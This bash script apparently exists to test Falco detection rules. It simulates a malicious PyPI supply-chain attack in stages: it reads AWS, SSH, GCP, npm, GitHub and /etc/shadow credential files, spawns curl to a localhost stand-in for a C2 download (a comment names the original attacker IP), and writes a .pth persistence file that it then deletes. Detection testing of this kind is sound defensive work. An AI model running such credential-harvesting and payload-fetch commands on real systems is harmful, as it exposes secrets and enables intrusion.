#!/usr/bin/env bash
# =============================================================================
# TeamPCP — Malicious PyPI Package + .pth Persistence
# Safe simulation of litellm/telnyx supply chain attack (March 2026)
#
# SAFE: No real malicious packages installed. All network calls target localhost.
#       .pth file written to user site-packages (no sudo required).
#
# Each stage maps to one Falco rule.
# =============================================================================

set -uo pipefail

BOLD='\033[1m'
RESET='\033[0m'
RED='\033[0;31m'
YELLOW='\033[0;33m'

echo -e "${BOLD}TeamPCP — Malicious PyPI Package + .pth Persistence${RESET}"
echo "Simulating litellm 1.82.7 / telnyx 4.87.1 attack chain"
echo ""

# =============================================================================
# Stage 1: Credential File Harvesting
# The malicious package reads credentials at import time (no install hook).
# Simulated by reading the same files the harvester targets.
# Expected rule: TeamPCP - Sensitive Credential File Read (WARNING)
# =============================================================================
echo -e "${BOLD}=== Stage 1: Credential File Harvesting ===${RESET}"
echo "Simulating: malicious telnyx._client reads 30+ credential categories at import"
echo ""

echo "Reading AWS credentials..."
cat ~/.aws/credentials         2>/dev/null | head -1 || true
cat ~/.aws/config              2>/dev/null | head -1 || true

echo "Reading SSH keys..."
ls ~/.ssh/id_* 2>/dev/null | head -3 || true
cat ~/.ssh/id_rsa              2>/dev/null | head -1 || true
cat ~/.ssh/id_ed25519          2>/dev/null | head -1 || true

echo "Reading GCP credentials..."
cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null | head -1 || true

echo "Reading npm token..."
cat ~/.npmrc 2>/dev/null | head -1 || true

echo "Reading GitHub CLI token..."
cat ~/.config/gh/hosts.yml 2>/dev/null | head -1 || true

echo "Reading /etc/shadow..."
cat /etc/shadow 2>/dev/null | head -1 || true

echo -e "${YELLOW}Expected rule: TeamPCP - Sensitive Credential File Read (WARNING)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 2: Network Tool Spawned During pip Install
# Simulates the malicious package calling back to C2 during import.
# We invoke curl as a child of python3 (mimicking import-time execution).
# SAFE: target is localhost:9999 (unreachable).
# Expected rule: TeamPCP - Network Tool Spawned During pip Install (WARNING)
# =============================================================================
echo -e "${BOLD}=== Stage 2: C2 Callback During Package Import ===${RESET}"
echo "Simulating: malicious package spawns curl to deliver second-stage payload"
echo "SAFE: target is localhost:9999 (no real C2 contacted)"
echo ""

python3 -c "
import subprocess, sys
# Simulate WAV steganography download (ringtone.wav from 83.142.209.203:8080)
# SAFE: targeting localhost
result = subprocess.run(
    ['curl', '-sf', '--max-time', '2', 'http://127.0.0.1:9999/ringtone.wav'],
    capture_output=True
)
" 2>/dev/null || true

echo -e "${YELLOW}Expected rule: TeamPCP - Network Tool Spawned During pip Install (WARNING)${RESET}"
echo "Note: rule fires when pip is ancestor — use pip install of a local package"
echo "      to trigger with full process tree in production environment"
echo ""
sleep 1

# =============================================================================
# Stage 3: .pth Persistence File Written
# TeamPCP drops litellm_init.pth so the harvester runs on every Python startup.
# Written to user site-packages (no root required on runners).
# Expected rule: TeamPCP - Python .pth Persistence File Written (WARNING)
# =============================================================================
echo -e "${BOLD}=== Stage 3: .pth File Persistence ===${RESET}"
echo "Simulating: writing litellm_init.pth to site-packages (TeamPCP persistence)"
echo ""

SITE_PKG=$(python3 -c "import site; print(site.getusersitepackages())" 2>/dev/null \
           || python3 -c "import site; print(site.getsitepackages()[0])" 2>/dev/null \
           || echo "/tmp/fake-site-packages")
mkdir -p "$SITE_PKG"

echo "Target: $SITE_PKG/litellm_init.pth"
# Write the .pth file from a non-pip process (this is the detection trigger)
printf '/tmp\n' > "${SITE_PKG}/litellm_init.pth"
echo "Written."

# Cleanup
rm -f "${SITE_PKG}/litellm_init.pth"

echo -e "${YELLOW}Expected rule: TeamPCP - Python .pth Persistence File Written (WARNING)${RESET}"
echo ""

# =============================================================================
echo -e "${BOLD}=== Simulation Complete ===${RESET}"
echo ""
echo "Rules expected to fire:"
echo "  WARNING  TeamPCP - Sensitive Credential File Read"
echo "  WARNING  TeamPCP - Network Tool Spawned During pip Install"
echo "  WARNING  TeamPCP - Python .pth Persistence File Written"
